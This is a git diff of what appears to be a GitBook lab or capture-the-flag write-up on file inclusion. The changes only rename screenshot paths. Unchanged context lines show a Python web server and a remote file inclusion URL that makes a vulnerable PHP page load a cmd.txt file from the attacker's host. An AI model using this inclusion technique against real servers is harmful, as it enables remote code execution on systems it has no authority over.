@@ -82,7 +82,7 @@ Page is getting rid of our slashes
 
 Changing to post and added extra slashed and null character at end.
 
-<figure><img src="../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (30) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -108,4 +108,4 @@ python2 -m SimpleHTTPServer 81
 hxxp://10.10.230.14/playground.php?file=http://10.10.11.193:81/cmd.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (5) (1).png" alt=""><figcaption></figcaption></figure>
